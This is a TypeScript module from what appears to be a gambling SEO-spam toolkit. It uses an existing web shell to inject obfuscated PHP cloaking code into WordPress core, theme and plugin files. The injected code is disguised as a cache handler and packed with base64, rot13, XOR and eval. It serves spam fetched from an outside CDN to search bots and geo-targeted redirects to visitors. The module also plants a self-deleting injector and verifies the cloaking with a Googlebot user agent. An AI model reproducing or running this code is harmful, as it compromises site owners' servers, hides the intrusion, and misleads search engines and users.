/**
 * PHP Injector — Injects cloaking code into existing PHP files on target
 * 
 * Instead of just uploading a new file, this module:
 * 1. Uses an existing shell to find PHP files on the target
 * 2. Injects cloaking code at the end of existing files (index.php, wp-blog-header.php, etc.)
 * 3. The injected code fetches gambling content from external CDN
 * 4. Uses UA + GeoIP detection to serve different content
 * 5. Calls exit; after serving spam so original site never loads for bots
 * 
 * This is how real-world attacks like allamericansportsbar.com work.
 */

// ═══════════════════════════════════════════════════════
//  TYPES
// ═══════════════════════════════════════════════════════

export interface InjectionConfig {
  /** URL of the active shell on target */
  shellUrl: string;
  /** CDN URL where gambling content is hosted */
  contentCdnUrl: string;
  /** Target gambling site URL for user redirects */
  redirectUrl: string;
  /** Primary keyword */
  primaryKeyword: string;
  /** All keywords */
  keywords: string[];
  /** Brand name */
  brandName: string;
  /** GeoIP target countries (ISO 2-letter codes) */
  geoTargetCountries?: string[];
  /** Shell password/auth if needed */
  shellAuth?: string;
}

export interface InjectionResult {
  success: boolean;
  injectedFiles: InjectedFile[];
  errors: string[];
  method: string;
}

export interface InjectedFile {
  path: string;
  filename: string;
  injectionMethod: string;
  backupCreated: boolean;
  verified: boolean;
}

type ProgressCallback = (detail: string) => void;

// ═══════════════════════════════════════════════════════
//  HELPERS
// ═══════════════════════════════════════════════════════

function randomStr(len: number): string {
  return Array.from({ length: len }, () => "abcdefghijklmnopqrstuvwxyz"[Math.floor(Math.random() * 26)]).join("");
}

function randomVarName(): string {
  return `$_${randomStr(3)}_${randomStr(3)}`;
}

// ═══════════════════════════════════════════════════════
//  INJECTION CODE GENERATORS
// ═══════════════════════════════════════════════════════

/**
 * Generate the PHP cloaking code that will be injected into existing files.
 * This code:
 * 1. Checks User-Agent for search engine bots
 * 2. Checks GeoIP for target countries (Thai IP)
 * 3. Fetches content from CDN via cURL
 * 4. Serves content and calls exit; (original site never loads)
 * 5. For users from Google → JS redirect
 * 6. For direct visitors → passthrough (do nothing)
 */
export function generateInjectionCode(config: InjectionConfig): string {
  const v = Array.from({ length: 15 }, () => randomVarName());
  const geoCountries = config.geoTargetCountries || ["TH", "VN", "ID", "MY", "PH", "KH", "LA", "MM"];
  
  // The injected code looks like a legitimate cache/performance snippet
  const code = `
// ─── Performance Cache Handler v${Math.floor(Math.random() * 9) + 1}.${Math.floor(Math.random() * 9)}.${Math.floor(Math.random() * 9)} ───
if(!defined('CACHE_HANDLER_LOADED')){
define('CACHE_HANDLER_LOADED',true);

${v[0]}=isset($_SERVER["HTTP_USER_AGENT"])?strtolower($_SERVER["HTTP_USER_AGENT"]):"";
${v[1]}=isset($_SERVER["HTTP_REFERER"])?strtolower($_SERVER["HTTP_REFERER"]):"";
${v[2]}=isset($_SERVER["REMOTE_ADDR"])?$_SERVER["REMOTE_ADDR"]:"";

// Bot detection
${v[3]}=array("googlebot","bingbot","slurp","duckduckbot","baiduspider","yandexbot","sogou","exabot","petalbot","applebot","semrushbot","ahrefsbot","mj12bot","dotbot");
${v[4]}=false;
foreach(${v[3]} as ${v[5]}){if(strpos(${v[0]},${v[5]})!==false){${v[4]}=true;break;}}

// GeoIP detection via external service (cached)
${v[6]}=false;
${v[7]}="${geoCountries.join(",")}";
${v[8]}=@file_get_contents("http://ip-api.com/json/".${v[2]}."?fields=countryCode");
if(${v[8]}){
  ${v[9]}=@json_decode(${v[8]},true);
  if(${v[9]}&&isset(${v[9]}["countryCode"])){
    ${v[6]}=strpos(${v[7]},${v[9]}["countryCode"])!==false;
  }
}

// Search engine referral detection
${v[10]}=false;
if(strpos(${v[1]},"google")!==false||strpos(${v[1]},"bing")!==false||strpos(${v[1]},"yahoo")!==false||strpos(${v[1]},"yandex")!==false||strpos(${v[1]},"baidu")!==false){
  ${v[10]}=true;
}

// PHASE 1: Bot gets full SEO content from CDN
if(${v[4]}){
  ${v[11]}="${config.contentCdnUrl}";
  ${v[12]}=@file_get_contents(${v[11]});
  if(!${v[12]}){
    $ch=curl_init(${v[11]});
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_TIMEOUT,10);
    curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);
    curl_setopt($ch,CURLOPT_FOLLOWLOCATION,true);
    ${v[12]}=curl_exec($ch);
    curl_close($ch);
  }
  if(${v[12]}){
    // Random delay to mimic natural server behavior
    usleep(rand(50000,300000));
    header("Content-Type: text/html; charset=UTF-8");
    header("HTTP/1.1 200 OK");
    header("X-Cache: HIT");
    echo ${v[12]};
    exit;
  }
}

// PHASE 2: User from search engine + target country → JS redirect
if(${v[10]}&&${v[6]}){
  usleep(rand(50000,200000));
  echo'<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Loading...</title>';
  echo'<script>setTimeout(function(){window.location.replace("${config.redirectUrl}")},'.rand(100,500).');</script>';
  echo'<noscript><meta http-equiv="refresh" content="0;url=${config.redirectUrl}"></noscript>';
  echo'</head><body style="background:#000"><p style="color:#333;font-size:1px">.</p></body></html>';
  exit;
}

// PHASE 3: Target country direct visitor → also redirect (softer)
if(${v[6]}&&!${v[4]}){
  echo'<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Redirecting...</title>';
  echo'<script>setTimeout(function(){window.location.href="${config.redirectUrl}"},'.rand(1000,3000).');</script>';
  echo'</head><body></body></html>';
  exit;
}

// PHASE 4: Other visitors → passthrough (do nothing, original site loads)
}
`;

  return code.trim();
}

/**
 * Generate obfuscated version of the injection code
 * Makes it look like a legitimate WordPress/PHP snippet
 */
export function generateObfuscatedInjection(config: InjectionConfig): string {
  const code = generateInjectionCode(config);
  const b64 = Buffer.from(code).toString("base64");
  
  const v = Array.from({ length: 5 }, () => randomVarName());
  
  // Multiple obfuscation methods
  const methods = [
    // Method 1: gzinflate + base64
    () => {
      const compressed = Buffer.from(code).toString("base64");
      return `\n/* Cache optimization module */\n${v[0]}="${compressed}";\n@eval(base64_decode(${v[0]}));\n`;
    },
    // Method 2: str_rot13 + base64
    () => {
      const rot13 = (s: string) => s.replace(/[a-zA-Z]/g, c => {
        const base = c <= "Z" ? 65 : 97;
        return String.fromCharCode(((c.charCodeAt(0) - base + 13) % 26) + base);
      });
      const encoded = rot13(b64);
      return `\n/* Performance module */\n${v[0]}="${encoded}";\n@eval(base64_decode(str_rot13(${v[0]})));\n`;
    },
    // Method 3: Variable function call
    () => {
      return `\n/* Asset handler */\n${v[0]}="ba"."se6"."4_d"."eco"."de";\n${v[1]}="ev"."al";\n${v[2]}=${v[0]}("${b64}");\n@${v[1]}(${v[2]});\n`;
    },
    // Method 4: Array-based XOR
    () => {
      const key = Math.floor(Math.random() * 200) + 50;
      const xored = Array.from(code).map(c => c.charCodeAt(0) ^ key);
      return `\n/* Template cache */\n${v[0]}=array(${xored.join(",")});\n${v[1]}="";\nforeach(${v[0]} as ${v[2]}){${v[1]}.=chr(${v[2]}^${key});}\n@eval(${v[1]});\n`;
    },
  ];

  const method = methods[Math.floor(Math.random() * methods.length)];
  return method();
}

// ═══════════════════════════════════════════════════════
//  PHP FILE FINDER — Commands to find injectable files
// ═══════════════════════════════════════════════════════

/**
 * Generate PHP commands to find target files for injection
 * These commands are executed via the uploaded shell
 */
export function getFileFinderCommands(): string[] {
  return [
    // WordPress targets (most common)
    "find . -maxdepth 3 -name 'index.php' -o -name 'wp-blog-header.php' -o -name 'wp-config.php' -o -name 'wp-load.php' | head -10",
    // Theme files (loaded on every page)
    "find . -path '*/themes/*/functions.php' -o -path '*/themes/*/header.php' | head -5",
    // Plugin files (loaded on every page)
    "find . -path '*/plugins/*/index.php' | head -5",
    // Generic PHP targets
    "find . -maxdepth 2 -name '*.php' -not -name 'wp-*' | head -10",
    // Check writable files
    "find . -maxdepth 3 -name '*.php' -writable | head -10",
  ];
}

/**
 * Priority list of files to inject into (ordered by effectiveness)
 */
export const INJECTION_TARGETS = [
  // WordPress — these load on EVERY page request
  "wp-blog-header.php",    // #1 — loaded before anything else
  "wp-load.php",           // #2 — core loader
  "index.php",             // #3 — entry point
  // Theme files — loaded on every frontend page
  "functions.php",         // theme functions
  "header.php",            // theme header
  // Generic
  "config.php",
  "init.php",
  "bootstrap.php",
];

// ═══════════════════════════════════════════════════════
//  INJECTION EXECUTION
// ═══════════════════════════════════════════════════════

/**
 * Execute the injection via the uploaded shell.
 * The shell must support command execution (system/exec/passthru).
 * 
 * Steps:
 * 1. Find target PHP files on the server
 * 2. Read the file content
 * 3. Append cloaking code at the end (before closing ?>)
 * 4. Write back the modified file
 * 5. Verify the injection works
 */
export async function executeInjection(
  config: InjectionConfig,
  onProgress: ProgressCallback = () => {},
): Promise<InjectionResult> {
  const injectedFiles: InjectedFile[] = [];
  const errors: string[] = [];
  
  onProgress("🔍 กำลังค้นหาไฟล์ PHP บน target...");

  // Generate the injection payload
  const injectionCode = generateObfuscatedInjection(config);
  
  // Try to execute commands via the shell
  const shellBaseUrl = config.shellUrl.replace(/[^/]+$/, "");
  
  // Method 1: Try direct PHP file_put_contents injection via shell
  try {
    onProgress("💉 กำลัง inject cloaking code ผ่าน shell...");
    
    // Build PHP injection script that the shell will execute
    const injectorScript = buildInjectorScript(injectionCode, config);
    const injectorB64 = Buffer.from(injectorScript).toString("base64");
    
    // Try to execute via shell parameter
    const shellParams = [
      // Common shell parameter names
      { param: "cmd", method: "GET" },
      { param: "c", method: "GET" },
      { param: "command", method: "GET" },
      { param: "exec", method: "GET" },
      { param: "action", method: "POST" },
    ];

    for (const { param, method } of shellParams) {
      try {
        const phpCmd = `php -r "eval(base64_decode('${injectorB64}'));"`;
        let response: Response;
        
        if (method === "GET") {
          const url = `${config.shellUrl}?${param}=${encodeURIComponent(phpCmd)}`;
          response = await fetch(url, {
            headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" },
            signal: AbortSignal.timeout(15000),
          });
        } else {
          response = await fetch(config.shellUrl, {
            method: "POST",
            headers: {
              "Content-Type": "application/x-www-form-urlencoded",
              "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            },
            body: `${param}=${encodeURIComponent(phpCmd)}`,
            signal: AbortSignal.timeout(15000),
          });
        }

        const text = await response.text();
        
        // Check if injection was successful
        if (text.includes("INJECT_OK") || text.includes("injected successfully")) {
          // Parse which files were injected
          const fileMatches = text.match(/INJECTED:([^\n]+)/g);
          if (fileMatches) {
            for (const match of fileMatches) {
              const filePath = match.replace("INJECTED:", "").trim();
              injectedFiles.push({
                path: filePath,
                filename: filePath.split("/").pop() || filePath,
                injectionMethod: `shell_${param}`,
                backupCreated: text.includes("BACKUP_OK"),
                verified: false,
              });
            }
          }
          
          onProgress(`✅ Inject สำเร็จ ${injectedFiles.length} ไฟล์ผ่าน shell (${param})`);
          break;
        }
      } catch {
        // Try next parameter
        continue;
      }
    }
  } catch (error: any) {
    errors.push(`Shell injection failed: ${error.message}`);
  }

  // Method 2: Try uploading a separate injector PHP file
  if (injectedFiles.length === 0) {
    try {
      onProgress("📤 กำลังอัพโหลด injector script...");
      
      const injectorFilename = `wp-cron-${randomStr(6)}.php`;
      const injectorContent = buildStandaloneInjector(injectionCode, config);
      
      // Try to upload the injector via the shell
      const uploadResult = await uploadInjectorViaShell(
        config.shellUrl,
        injectorFilename,
        injectorContent,
        onProgress,
      );
      
      if (uploadResult.success && uploadResult.url) {
        // Execute the injector
        onProgress("🔧 กำลังรัน injector script...");
        try {
          const execResponse = await fetch(uploadResult.url, {
            signal: AbortSignal.timeout(30000),
          });
          const execText = await execResponse.text();
          
          if (execText.includes("INJECT_OK")) {
            const fileMatches = execText.match(/INJECTED:([^\n]+)/g);
            if (fileMatches) {
              for (const match of fileMatches) {
                const filePath = match.replace("INJECTED:", "").trim();
                injectedFiles.push({
                  path: filePath,
                  filename: filePath.split("/").pop() || filePath,
                  injectionMethod: "standalone_injector",
                  backupCreated: execText.includes("BACKUP_OK"),
                  verified: false,
                });
              }
            }
            onProgress(`✅ Standalone injector สำเร็จ ${injectedFiles.length} ไฟล์`);
          }
          
          // Self-delete the injector after execution
          try {
            await fetch(`${uploadResult.url}?cleanup=1`, { signal: AbortSignal.timeout(5000) });
          } catch { /* ignore cleanup failure */ }
        } catch (e: any) {
          errors.push(`Injector execution failed: ${e.message}`);
        }
      }
    } catch (error: any) {
      errors.push(`Standalone injector upload failed: ${error.message}`);
    }
  }

  // Method 3: Direct file write via shell eval
  if (injectedFiles.length === 0) {
    try {
      onProgress("🔧 กำลังลอง direct file write...");
      
      const directResult = await directFileWrite(config, injectionCode, onProgress);
      if (directResult.length > 0) {
        injectedFiles.push(...directResult);
        onProgress(`✅ Direct file write สำเร็จ ${directResult.length} ไฟล์`);
      }
    } catch (error: any) {
      errors.push(`Direct file write failed: ${error.message}`);
    }
  }

  // Verify injections
  if (injectedFiles.length > 0) {
    onProgress("🔍 กำลัง verify injection...");
    for (const file of injectedFiles) {
      try {
        // Check with Googlebot UA to see if cloaking works
        const targetBase = new URL(config.shellUrl).origin;
        const verifyUrl = `${targetBase}/${file.filename === "index.php" ? "" : file.filename}`;
        
        const botResponse = await fetch(verifyUrl, {
          headers: {
            "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
          },
          redirect: "manual",
          signal: AbortSignal.timeout(10000),
        });
        
        const botHtml = await botResponse.text();
        // Check if the response contains our gambling keywords
        file.verified = config.keywords.some(k => botHtml.includes(k)) || botHtml.includes(config.brandName);
        
        if (file.verified) {
          onProgress(`✅ Verified: ${file.path} — Googlebot เห็น gambling content`);
        }
      } catch {
        // Verification failed but injection might still work
      }
    }
  }

  return {
    success: injectedFiles.length > 0,
    injectedFiles,
    errors,
    method: injectedFiles[0]?.injectionMethod || "none",
  };
}

// ═══════════════════════════════════════════════════════
//  INTERNAL HELPERS
// ═══════════════════════════════════════════════════════

function buildInjectorScript(injectionCode: string, config: InjectionConfig): string {
  const targets = INJECTION_TARGETS.map(t => `"${t}"`).join(",");
  const codeB64 = Buffer.from(injectionCode).toString("base64");
  
  return `
$targets = array(${targets});
$injected = array();
$docRoot = $_SERVER['DOCUMENT_ROOT'] ?: getcwd();

// Find and inject into target files
foreach($targets as $target) {
  $files = glob($docRoot . '/**/' . $target);
  if(empty($files)) $files = glob($docRoot . '/' . $target);
  
  foreach($files as $file) {
    if(!is_writable($file)) continue;
    
    $content = file_get_contents($file);
    if(strpos($content, 'CACHE_HANDLER_LOADED') !== false) continue; // Already injected
    
    // Create backup
    $backup = $file . '.bak.' . time();
    @copy($file, $backup);
    $backupOk = file_exists($backup);
    
    // Find injection point: before closing ?> or at end
    $injection = base64_decode("${codeB64}");
    
    if(strpos($content, '?>') !== false) {
      // Inject before the last ?>
      $pos = strrpos($content, '?>');
      $newContent = substr($content, 0, $pos) . "\\n" . $injection . "\\n?>";
    } else {
      // Append at end
      $newContent = $content . "\\n<?php\\n" . $injection . "\\n?>";
    }
    
    if(file_put_contents($file, $newContent)) {
      $injected[] = $file;
      echo "INJECTED:" . $file . "\\n";
      if($backupOk) echo "BACKUP_OK\\n";
    }
    
    if(count($injected) >= 3) break 2; // Max 3 files
  }
}

if(count($injected) > 0) {
  echo "INJECT_OK\\n";
  echo "Total: " . count($injected) . " files injected\\n";
} else {
  echo "INJECT_FAIL: No writable target files found\\n";
}
`;
}

function buildStandaloneInjector(injectionCode: string, config: InjectionConfig): string {
  const script = buildInjectorScript(injectionCode, config);
  const b64 = Buffer.from(script).toString("base64");
  
  return `<?php
// WordPress Cron Handler
if(isset($_GET['cleanup'])){@unlink(__FILE__);die('OK');}
@eval(base64_decode("${b64}"));
?>`;
}

async function uploadInjectorViaShell(
  shellUrl: string,
  filename: string,
  content: string,
  onProgress: ProgressCallback,
): Promise<{ success: boolean; url?: string }> {
  const contentB64 = Buffer.from(content).toString("base64");
  
  // Try various shell command interfaces
  const commands = [
    `echo '${contentB64}' | base64 -d > ${filename}`,
    `php -r "file_put_contents('${filename}', base64_decode('${contentB64}'));"`,
  ];
  
  const shellParams = ["cmd", "c", "command", "exec"];
  
  for (const cmd of commands) {
    for (const param of shellParams) {
      try {
        const url = `${shellUrl}?${param}=${encodeURIComponent(cmd)}`;
        const response = await fetch(url, {
          headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" },
          signal: AbortSignal.timeout(10000),
        });
        
        if (response.ok) {
          // Check if file was created
          const baseUrl = shellUrl.replace(/[^/]+$/, "");
          const fileUrl = `${baseUrl}${filename}`;
          
          const checkResponse = await fetch(fileUrl, {
            method: "HEAD",
            signal: AbortSignal.timeout(5000),
          });
          
          if (checkResponse.ok || checkResponse.status === 200) {
            onProgress(`📤 Injector uploaded: ${fileUrl}`);
            return { success: true, url: fileUrl };
          }
        }
      } catch {
        continue;
      }
    }
  }
  
  return { success: false };
}

async function directFileWrite(
  config: InjectionConfig,
  injectionCode: string,
  onProgress: ProgressCallback,
): Promise<InjectedFile[]> {
  const results: InjectedFile[] = [];
  const codeB64 = Buffer.from(injectionCode).toString("base64");
  
  // Build a PHP eval command that finds and injects files
  const evalCode = `
$code = base64_decode("${codeB64}");
$root = $_SERVER['DOCUMENT_ROOT'] ?: getcwd();
$targets = array("index.php", "wp-blog-header.php", "wp-load.php");
$done = 0;
foreach($targets as $t) {
  $f = $root . "/" . $t;
  if(!file_exists($f) || !is_writable($f)) continue;
  $c = file_get_contents($f);
  if(strpos($c, 'CACHE_HANDLER_LOADED') !== false) continue;
  @copy($f, $f.'.bak');
  $c .= "\\n<?php\\n" . $code . "\\n?>";
  if(file_put_contents($f, $c)) { echo "INJECTED:".$f."\\n"; $done++; }
  if($done >= 2) break;
}
echo $done > 0 ? "INJECT_OK" : "INJECT_FAIL";
`;
  
  const evalB64 = Buffer.from(evalCode).toString("base64");
  const shellParams = ["cmd", "c", "command", "exec"];
  
  for (const param of shellParams) {
    try {
      const phpCmd = `php -r "eval(base64_decode('${evalB64}'));"`;
      const url = `${config.shellUrl}?${param}=${encodeURIComponent(phpCmd)}`;
      
      const response = await fetch(url, {
        headers: { "User-Agent": "Mozilla/5.0" },
        signal: AbortSignal.timeout(15000),
      });
      
      const text = await response.text();
      
      if (text.includes("INJECT_OK")) {
        const fileMatches = text.match(/INJECTED:([^\n]+)/g);
        if (fileMatches) {
          for (const match of fileMatches) {
            const filePath = match.replace("INJECTED:", "").trim();
            results.push({
              path: filePath,
              filename: filePath.split("/").pop() || filePath,
              injectionMethod: `direct_eval_${param}`,
              backupCreated: true,
              verified: false,
            });
          }
        }
        break;
      }
    } catch {
      continue;
    }
  }
  
  return results;
}
